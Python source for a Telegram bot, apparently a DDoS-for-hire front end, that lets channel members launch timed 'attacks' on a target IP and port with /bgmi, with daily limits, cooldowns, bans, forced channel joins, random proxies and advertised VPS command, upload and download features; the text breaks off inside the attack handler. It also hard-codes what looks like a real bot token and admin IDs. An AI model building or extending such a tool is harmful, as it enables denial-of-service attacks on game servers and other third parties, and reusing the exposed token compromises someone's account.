import telebot
import logging
import asyncio
import time
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
from datetime import datetime, timedelta, timezone
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot.apihelper import ApiTelegramException
import json
from telebot import apihelper
import random
import traceback
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



TOKEN = "7110241354:AAHng_FGT-hlCSgfYEbMejzrUkcFbMrUW00"
ADMIN_IDS = "1697639516"
GROUP_ID = "-1002628629368"
FEEDBACK_CHANNEL_ID = "-1002628629368"
JOIN_CHANNEL_ID = "-1002628629368"
EXEMPTED_USERS = ["1697639516"]


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

bot = telebot.TeleBot(TOKEN)

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

user_attacks = {}
user_cooldowns = {}
user_photos = {}  
user_bans = {}  
last_feedback_photo = {}
reset_time = datetime.now().astimezone(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

COOLDOWN_DURATION = 2 
BAN_DURATION = timedelta(minutes=10)  
DAILY_ATTACK_LIMIT = 30

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


@bot.callback_query_handler(func=lambda call: call.data == "user_status")
def handle_user_status_callback(call):
    try:
        user = call.from_user
        user_id = user.id
        user_name = user.first_name or "⚡ VIP USER"

        # 💣 Attack Info
        if attack_running and attack_end_time:
            time_left = max(0, int((attack_end_time - datetime.now()).total_seconds()))
            m, s = divmod(time_left, 60)
            attack_status = f"🔥 *ACTIVE ATTACK*\n    ⏳ *Time Left:* `{m}m {s}s`"
        else:
            attack_status = "✅ *SAFE MODE*\n    🛡 *No Active Attack*"

        # 🎯 Attack Count
        used = user_attacks.get(user_id, 0)
        remaining = DAILY_ATTACK_LIMIT - used
        attack_count = f"🎯 *ATTACKS LEFT:* `{remaining}` / `{DAILY_ATTACK_LIMIT}`"

        # 🌟 Ultra Stylish Text
        msg = (
            f"╭━━━〔 💥 *𝐈𝐒𝐀𝐆𝐈 𝗦𝗧𝗔𝗧𝗨𝗦* 💥 〕━━━╮\n"
            f"┃ 👤 *User:* `{user_name}`\n"
            f"┃━━━━━━━━━━━━━━━━━━━━━┃\n"
            f"┃ {attack_status}\n"
            f"┃ {attack_count}\n"
            f"┃━━━━━━━━━━━━━━━━━━━━━┃\n"
            f"┃ 💀 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝐈𝐒𝐀𝐆𝐈 × DILDOS™* 💀\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━╯"
        )

        # 📸 With DP if possible
        photo_sent = False
        try:
            photos = bot.get_user_profile_photos(user_id)
            if photos.total_count > 0:
                photo_id = photos.photos[0][0].file_id
                bot.send_photo(
                    chat_id=call.message.chat.id,
                    photo=photo_id,
                    caption=msg,
                    parse_mode="Markdown",
                    reply_to_message_id=call.message.message_id
                )
                photo_sent = True
        except:
            pass

        # 💬 Fallback if no DP
        if not photo_sent:
            bot.send_message(
                call.message.chat.id,
                msg,
                parse_mode="Markdown",
                reply_to_message_id=call.message.message_id
            )

        # ✅ Extra Confirmation
        bot.send_message(
            call.message.chat.id,
            f"📊 *Sourav STATUS SENT!* ✅\n🔥 *Stay Flash, Stay Brutal!*",
            parse_mode="Markdown"
        )

    except Exception as e:
        bot.send_message(
            call.message.chat.id,
            f"❌ *ERROR:*\n`{e}`",
            parse_mode="Markdown"
        )


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def load_proxies():
    with open("proxies.json") as f:
        return json.load(f)

def get_random_proxy():
    proxies = load_proxies()
    return random.choice(proxies)

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

@bot.message_handler(commands=['id'])
def get_id(message):
    bot.reply_to(message, f"🆔 Chat ID: `{message.chat.id}`", parse_mode='Markdown')

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    all_users.add(message.from_user.id)
    save_users()
    user_name = message.from_user.first_name or "User"


    # Try fetching user profile photo
    try:
        photos = bot.get_user_profile_photos(user_id)
        has_photo = photos.total_count > 0
    except Exception as e:
        has_photo = False
        print(f"Error fetching profile photo: {e}")

    # Stylish welcome message
    welcome_text = (
        f"👋🏻 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {user_name}!* 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 *𝗧𝗛𝗜𝗦 𝗜𝗦 𝐈𝐒𝐀𝐆𝐈 𝗕𝗢𝗧!*\n\n"
        f"🆔 *User ID:* `{user_id}`\n\n"
        "📢 *𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:*\n\n"
        "[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/+hqtU3MTPU28xNDE1)\n\n"
        "📌 *𝗧𝗿𝘆 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:*\n"
        "`/bgmi` - 🚀 *Start an attack!*\n\n"
        "👑 *𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬:* [@bgmibunny](https://t.me/+hqtU3MTPU28xNDE1) 💀"
    )

    # Inline buttons
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("➖ 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 ➖", url="https://t.me/+hqtU3MTPU28xNDE1")
    )
    keyboard.add(
        InlineKeyboardButton("👑 𝗖𝗥𝗘𝗔𝗧𝗢𝗥 👑", url="https://t.me/+hqtU3MTPU28xNDE1")
    )

    # Send message with or without photo
    if has_photo:
        try:
            file_id = photos.photos[0][0].file_id
            bot.send_photo(
                chat_id=message.chat.id,
                photo=file_id,
                caption=welcome_text,
                parse_mode="Markdown",
                reply_markup=keyboard
            )
        except Exception as e:
            print(f"Failed to send photo: {e}")
            bot.send_message(
                chat_id=message.chat.id,
                text=welcome_text,
                parse_mode="Markdown",
                disable_web_page_preview=True,
                reply_markup=keyboard
            )
    else:
        bot.send_message(
            chat_id=message.chat.id,
            text=welcome_text,
            parse_mode="Markdown",
            disable_web_page_preview=True,
            reply_markup=keyboard
        )

    # Rebranding DM message
    bot.send_message(
        chat_id=message.chat.id,
        text=(
            "↘️                                                       ↙️\n\n"
            "     [➖𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚➖](https://t.me/SLAYER_OP7)\n\n"
            "↗️                                                       ↖️"
        ),
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "🔥 *TF_FLASH BOT - Command List* 🔥\n\n"
        
        "🚀 *Attack Commands:*\n"
        "┣ `/bgmi <target_ip> <port> <duration>` - ⚡ *Start an Attack*\n\n"
        
        "📊 *Status & Admin Commands:*\n"
        "┣ `/status` - 🕒 *Check Attack & Cooldown Status*\n"
        "┣ `/reset_TF` - 🔄 *Reset Attack Limits (Admin Only)*\n\n"
        
        "⚙️ *VPS Management:*\n"
        "┣ `VPS` - 💻 *Open VPS Terminal*\n"
        "┣ `Command` - 🔎 *Execute a VPS Command*\n"
        "┣ `Upload` - 📤 *Upload a File to VPS*\n"
        "┣ `Download` - 📥 *Download a File from VPS*\n\n"
        
        "🔗 *Other Commands:*\n"
        "┣ `/start` - 👋 *Welcome & Bot Info*\n"
        "┣ `/help` - 📜 *Show This Help Menu*\n"
        "┣ `<< Back to Menu` - 🔄 *Return to Main Menu*\n\n"
        
        "📢 [Join Channel](https://t.me/+hqtU3MTPU28xNDE1)\n"
        "👑 [Bot Creator](https://t.me/+hqtU3MTPU28xNDE1)"
    )

    bot.send_message(message.chat.id, help_text, parse_mode="Markdown", disable_web_page_preview=True)

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# PAPA SLAYER_OP7
# 🌪️『 𝗨𝗟𝗧𝗥𝗔 𝗦𝗧𝗔𝗧𝗨𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 🔥 』🌪️


from threading import Thread

@bot.message_handler(commands=['status'])
def status_command(message):
    Thread(target=handle_status, args=(message,)).start()

def handle_status(message):
    user = message.from_user
    user_id = user.id
    user_name = user.first_name or "🚀 𝗩𝗜𝗣 𝗨𝗦𝗘𝗥"

    # Status values
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    remaining_ban_time = max(0, int((user_bans.get(user_id, datetime.min) - datetime.now()).total_seconds()))
    remaining_cooldown = max(0, int((user_cooldowns.get(user_id, datetime.min) - datetime.now()).total_seconds()))

    # Profile photo check
    has_dp = False
    photo_id = None
    try:
        photos = bot.get_user_profile_photos(user_id)
        if photos.total_count > 0:
            photo_id = photos.photos[0][0].file_id
            has_dp = True
    except Exception as e:
        print(f"[DP Fetch Error] {e}")

    # Format values
    ban_minutes, ban_seconds = divmod(remaining_ban_time, 60)
    cooldown_minutes, cooldown_seconds = divmod(remaining_cooldown, 60)

    ban_status = f"🚫 𝗕𝗔𝗡𝗡𝗘𝗗: {ban_minutes}m {ban_seconds}s ⛔" if remaining_ban_time else "✅ 𝗡𝗢𝗧 𝗕𝗔𝗡𝗡𝗘𝗗 🟢"
    cooldown_status = f"🕒 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: {cooldown_minutes}m {cooldown_seconds}s ⏳" if remaining_cooldown else "✅ 𝗡𝗢 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 🔥"

    status_text = (
        f"╭━━━〔 🎯 *𝐈𝐒𝐀𝐆𝐈 𝗦𝗧𝗔𝗧𝗨𝗦* 〕━━━╮\n"
        f"┃ 👤 *User:* `{user_name}`\n"
        f"┃ 🆔 *ID:* `{user_id}`\n"
        f"┃ 📅 *Time:* `{datetime.now().strftime('%d-%b %I:%M %p')}`\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃ ⚔️ *Attacks Left:* `{remaining_attacks}/{DAILY_ATTACK_LIMIT}`\n"
        f"┃ {ban_status}\n"
        f"┃ {cooldown_status}\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃ 💥 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝐈𝐒𝐀𝐆𝐈 x 𝗗𝗜𝗟𝗗𝗢𝗦™* 💀\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )

    # Send based on profile photo
    try:
        if has_dp:
            bot.send_photo(
                chat_id=message.chat.id,
                photo=photo_id,
                caption=status_text,
                parse_mode="Markdown",
                reply_to_message_id=message.message_id
            )
        else:
            bot.send_message(
                chat_id=message.chat.id,
                text=status_text,
                parse_mode="Markdown",
                reply_to_message_id=message.message_id
            )
    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"❌ *Status Error:* `{e}`",
            parse_mode="Markdown"
        )





# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime

# ✅ Custom Markdown Escaper (for v1)
def escape_markdown(text):
    if not text:
        return ""
    escape_chars = ['_', '*', '`', '[']
    for char in escape_chars:
        text = text.replace(char, f"\\{char}")
    return text

@bot.message_handler(commands=['chk'])
def chk_cmd(message):
    attack_status_command(message, replying=True)

def attack_status_command(message, replying=True, user_override=None):
    global attack_end_time, attack_running
    user = user_override or message.from_user
    user_id = user.id
    user_name = escape_markdown(user.first_name or "🚀 𝗩𝗜𝗣 𝗨𝗦𝗘𝗥")
    username = f"@{escape_markdown(user.username)}" if user.username else "N/A"

    # Time left
    if attack_running and attack_end_time:
        remaining = max(0, int((attack_end_time - datetime.now()).total_seconds()))
        minutes, seconds = divmod(remaining, 60)
        attack_status = "⚡ *RUNNING*"
        time_left = f"`{minutes}m {seconds}s`"
    else:
        attack_status = "✅ *SAFE MODE ACTIVE*"
        time_left = "`0m 0s`"

    # Profile photo
    has_dp = False
    photo_id = None
    try:
        photos = bot.get_user_profile_photos(user_id)
        if photos.total_count > 0:
            photo_id = photos.photos[0][0].file_id
            has_dp = True
    except Exception as e:
        print(f"[CHK DP Fetch Error] {e}")

    # Final status message
    text = (
        f"╭━━〔 ⚔️ *𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦* 〕━━╮\n"
        f"┃ 👤 *Name:* `{user_name}`\n"
        f"┃ 🆔 *ID:* `{user_id}`\n"
        f"┃ 🔗 *Username:* {username}\n"
        f"┃ 🕒 *Time Left:* {time_left}\n"
        f"┃ 🚀 *Status:* {attack_status}\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━╯"
    )

    # Inline refresh button
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔁 REFRESH STATUS", callback_data="refresh_chk"))

    try:
        if has_dp:
            bot.send_photo(
                chat_id=message.chat.id,
                photo=photo_id,
                caption=text,
                parse_mode="Markdown",
                reply_markup=markup,
                reply_to_message_id=message.message_id if replying else None
            )
        else:
            bot.send_message(
                chat_id=message.chat.id,
                text=text,
                parse_mode="Markdown",
                reply_markup=markup,
                reply_to_message_id=message.message_id if replying else None
            )
    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"❌ *CHK Status Error:* `{e}`",
            parse_mode="Markdown"
        )

# Refresh handler
@bot.callback_query_handler(func=lambda call: call.data == "refresh_chk")
def refresh_chk_callback(call):
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass
    attack_status_command(call.message, replying=False, user_override=call.from_user)


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# 🔄 『 𝑹𝒆𝒔𝒆𝒕 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒊𝒎𝒊𝒕𝒔 』🔄

from telebot.types import ReplyKeyboardRemove

@bot.message_handler(commands=['reset'])
def reset_attack_limits(message):
    args = message.text.split()

    # 🧾 Validate command arguments
    if len(args) < 2:
        bot.reply_to(
            message,
            "❌ **Usage:** `/reset <user_id>`\n🔹 Example: `/reset 123456789`",
            parse_mode="Markdown"
        )
        return

    try:
        target_user_id = int(args[1])
    except ValueError:
        bot.reply_to(
            message,
            "❌ **Invalid User ID!**\n🔹 *Please enter a valid numeric ID.*",
            parse_mode="Markdown"
        )
        return

    # 🔐 Admin Access Check
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(
            message,
            "🚫 **ACCESS DENIED!** 🚫\n💀 *𝐁𝐄𝐓𝐀, 𝐓𝐔 𝐀𝐃𝐌𝐈𝐍 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈!* 💀",
            parse_mode="Markdown"
        )
        return

    try:
        # 🔄 Starting Reset Process
        loading_msg = bot.reply_to(
            message,
            f"🟢 **𝗥𝗘𝗦𝗘𝗧𝗧𝗜𝗡𝗚 `{target_user_id}`...** ⏳",
            parse_mode="Markdown"
        )

        steps = [
            "🔹 **𝗘𝗿𝗮𝘀𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗼𝗴𝘀...** 🗑️",
            "🔹 **𝗥𝗲𝗺𝗼𝘃𝗶𝗻𝗴 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻𝘀...** ❌",
            "🔹 **𝗖𝗹𝗲𝗮𝗿𝗶𝗻𝗴 𝗕𝗮𝗻 𝗟𝗶𝘀𝘁...** 🚷",
            "🔹 **𝗥𝗲𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗶𝗺𝗶𝘁𝘀...** ⚙️",
            "🔹 **𝗢𝗽𝘁𝗶𝗺𝗶𝘇𝗶𝗻𝗴 𝗧𝗙 𝗕𝗢𝗧...** 🔧"
        ]

        for step in steps:
            time.sleep(1.2)
            try:
                bot.edit_message_text(
                    step,
                    chat_id=message.chat.id,
                    message_id=loading_msg.message_id,
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"[Edit Error Ignored] {e}")

        # ✅ Reset user data
        user_attacks.pop(target_user_id, None)
        user_cooldowns.pop(target_user_id, None)
        user_bans.pop(target_user_id, None)
        user_photos.pop(target_user_id, None)

        # ✅ Final Confirmation
        final_msg = (
            f"🔥 **𝙍𝙀𝙎𝙀𝙏 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 𝗙𝗢𝗥 `{target_user_id}`!** 🔥\n\n"
            "⚡ *𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗶𝗺𝗶𝘁𝘀, 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻𝘀, 𝗕𝗮𝗻𝘀 = 𝗪𝗶𝗽𝗲𝗱!* ⚡\n\n"
            "✅ *𝗥𝗲𝗮𝗱𝘆 𝘁𝗼 𝗟𝗮𝘂𝗻𝗰𝗵!* 🚀"
        )

        bot.edit_message_text(
            final_msg,
            chat_id=message.chat.id,
            message_id=loading_msg.message_id,
            parse_mode="Markdown"
            # ❌ DON'T include ReplyKeyboardRemove here — only valid for send_message
        )

    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"❌ **Error occurred:** `{e}`",
            parse_mode="Markdown"
        )



# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

        

        
        
        
# --------------------[ ATTACK & FEEDBACK SECTION ]----------------------






@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    username = message.from_user.username or "Anonymous"
    user_id = message.from_user.id
    photo = message.photo[-1].file_id

    # Escape Markdown-sensitive characters in username
    def escape_md(text):
        for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:
            text = text.replace(ch, f'\\{ch}')
        return text

    escaped_username = escape_md(username)

    # Check if the user has sent the same feedback before & give a warning
    if last_feedback_photo.get(user_id) == photo:
        try:
            until_time = int(time.time() + 600)  # 10 minutes mute

            bot.restrict_chat_member(
                chat_id=chat_id,
                user_id=user_id,
                permissions=types.ChatPermissions(can_send_messages=False),
                until_date=until_time
            )

            warning_msg = (
                "🚨⚠️ *『 𝗗𝗨𝗣𝗟𝗜𝗖𝗔𝗧𝗘 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗 ! 』* ⚠️🚨\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 *User:* @{escaped_username}\n"
                "😡 *SAME 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗦𝗣𝗢𝗧𝗧𝗘𝗗!*\n"
                "🔇 *𝗠𝗨𝗧𝗘𝗗 𝗙𝗢𝗥 𝟭𝟬 𝗠𝗜𝗡𝗨𝗧𝗘𝗦 ❗️*\n"
                "📸 *Please avoid spamming the same photo again!*\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🧠 *Think twice. Send once.*\n"
                "🔁 *Try again later with something NEW!*"
            )
            bot.reply_to(message, warning_msg, parse_mode="Markdown")
        except Exception as e:
            bot.reply_to(message, f"❌ *Mute Error:* `{e}`", parse_mode="Markdown")
        return

    last_feedback_photo[user_id] = photo
    user_photos[user_id] = True

    response = (
        "✨ *𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗!*\n"
        "➖➖➖➖➖➖➖➖\n"
        f"👤 *𝗨𝘀𝗲𝗿:* @{escaped_username}\n"
        "💌 *𝗪𝗲 𝗮𝗽𝗽𝗿𝗲𝗰𝗶𝗮𝘁𝗲 𝘆𝗼𝘂𝗿 𝗶𝗻𝗽𝘂𝘁!* 🤍\n"
        "➖➖➖➖➖➖➖➖"
    )
    bot.reply_to(message, response, parse_mode="Markdown")

    for admin_id in ADMIN_IDS:
        bot.forward_message(admin_id, message.chat.id, message.message_id)
        admin_response = (
            "🚀🔥 *『 𝑵𝑬𝑾 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』* 🔥🚀\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{escaped_username} 🛡️\n"
            f"🆔 *𝙐𝙨𝙚r 𝙄𝘿:* `{user_id}`\n"
            "📸 *𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!!* ⬇️\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(admin_id, admin_response, parse_mode="Markdown")

    channel_caption = (
        "╔═════◇🌐 * 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗔𝗟𝗘𝗥𝗧 * 🌐◇═════╗\n"
        f"👤 * 𝗨𝘀𝗲𝗿 :*  @{escaped_username}\n"
        f"🆔 * 𝗨𝘀𝗲𝗿 𝗜𝗗 :*  `{user_id}`\n"
        "📸 * 𝗦𝗵𝗮𝗿𝗲𝗱 𝗮 𝗣𝗵𝗼𝘁𝗼 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸 ! * 🖼️\n"
        "╚════════════════════════════╝\n"
        "💬 * 𝗞𝗘𝗘𝗣 𝗦𝗛𝗔𝗥𝗜𝗡𝗚 𝗧𝗛𝗘 𝗩𝗜𝗕𝗘𝗦 ! * 💎"
    )

    bot.send_photo(
        FEEDBACK_CHANNEL_ID,
        photo,
        caption=channel_caption,
        parse_mode="Markdown"
    )



# ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Track if an attack is currently running
attack_running = False  # ✅ Ek time pe sirf ek attack allow karega
attack_end_time = None  # ✅ Track end time of running attack

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global attack_running, user_cooldowns, user_photos, user_bans, attack_running, attack_end_time
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"
    required_channel = JOIN_CHANNEL_ID  # Replace with your actual channel ID

    try:
        user_status = bot.get_chat_member(required_channel, user_id).status
        if user_status not in ["member", "administrator", "creator"]:
            
            # 🔹 Inline Button for Joining Channel
            keyboard = InlineKeyboardMarkup()
            join_button = InlineKeyboardButton("➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖", url="https://t.me/+hqtU3MTPU28xNDE1")
            keyboard.add(join_button)

            try:
                # ✅ Fetch user profile photo
                photos = bot.get_user_profile_photos(user_id)

                if photos.total_count > 0:
                    photo_file_id = photos.photos[0][0].file_id  # ✅ User ki latest DP

                    # ✅ Send message with DP + Button (FIXED)
                    bot.send_photo(
                        message.chat.id,
                        photo_file_id,
                        caption=(
                            f"👤 **User:** `{message.from_user.first_name}`\n\n"
                            " *‼️𝐈𝐒𝐀𝐆𝐈 𝐗 𝐃𝐃𝐎𝐒 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃‼️* \n\n"
                            "📢 *LET'S GO AND JOIN CHANNEL*\n\n"
                            f" [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/+hqtU3MTPU28xNDE1)\n\n"
                            " *‼️𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /bgmi 𝗮𝗴𝗮𝗶𝗻‼️*"
                        ),
                        parse_mode="Markdown",
                        reply_markup=keyboard  # ✅ Add Inline Button
                    )
                else:
                    raise Exception("User ke paas DP nahi hai.")  # **Agar DP nahi hai toh error throw karenge**

            except Exception as e:
                # ❌ Agar DP fetch nahi ho rahi, toh normal message bhejo (FIXED)
                bot.send_message(
                    message.chat.id,
                    f"⚠️ **DP Error:** {e}\n\n"
                    " *‼️𝐈𝐒𝐀𝐆𝐈 𝐗 𝐃𝐃𝐎𝐒 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃‼️* \n\n"
                    "📢 *LET'S GO AND JOIN CHANNEL*\n\n"
                    f" [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/+hqtU3MTPU28xNDE1)\n\n"
                    " *‼️𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /bgmi 𝗮𝗴𝗮𝗶𝗻‼️*",
                    parse_mode="Markdown",
                    disable_web_page_preview=True,  # ✅ Yeh sirf send_message() me hoga, send_photo() me nahi
                    reply_markup=keyboard  
                )

            return

    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"⚠️ *Error checking channel membership: {e}*"
        )
        return



    if attack_running:  # ✅ Pehle se attack chal raha ho toh error message dega
        bot.reply_to(message, "🚨🔥 『  𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙃𝘼𝙇 𝙍𝙃𝘼 𝙃𝘼𝙄! 』🔥🚨\n\n⚠️ 𝗕𝗘𝗧𝗔 𝗦𝗔𝗕𝗥 𝗞𝗔𝗥! 😈💥\n\n🔄 ATTACK REMAINING TIME :- /chk ! 💥💣.")
        return

    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != GROUP_ID:
        bot.send_message(
            message.chat.id,
            "🚫 𝙒𝙊𝙃𝙊𝙊 𝘽𝙍𝙊𝙊𝙊!! 𝙔𝙤𝙪 𝙘𝙖𝙣'𝙩 𝙧𝙪𝙣 𝙢𝙚 𝙝𝙚𝙧𝙚 😤\n\n"
            "❌ 𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙨 𝙇𝙊𝘾𝙆𝙀𝘿 𝙩𝙤 𝙞𝙩𝙨 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 𝙂𝙍𝙊𝙐𝙋 𝙊𝙉𝙇𝙔 ⚙️\n\n"
            "🔗 𝙅𝙤𝙞𝙣 𝙏𝙝𝙚 𝙃𝙊𝙈𝙀 𝙊𝙁 𝙋𝙊𝙒𝙀𝙍: [sourav](https://t.me/+hqtU3MTPU28xNDE1)\n\n"
            "👑 𝘽𝙊𝙏 𝘾𝙍𝙀𝘼𝙏𝙊𝙍: @bgmibunny (𝙏𝙐𝙈𝙃𝘼𝙍𝙀_𝙋𝘼𝙋𝘼) 👑"
        )
        return


    # Reset counts daily
    reset_daily_counts()

    
    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining, 60)
            username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

            bot.send_message(
                message.chat.id,
                f"🚫 ꧁ 𝗧𝗨 𝘽𝘼𝙉 𝙃𝘼𝙄 😤 ꧂\n"
                f"👤 𝙐𝙨𝙚𝙧: `{username}`\n"
                f"⏳ 𝙒𝙖𝙞𝙩 𝙆𝙖𝙧 𝘽𝙝𝙖𝙞: `{int(minutes)}m {int(seconds)}s`\n"
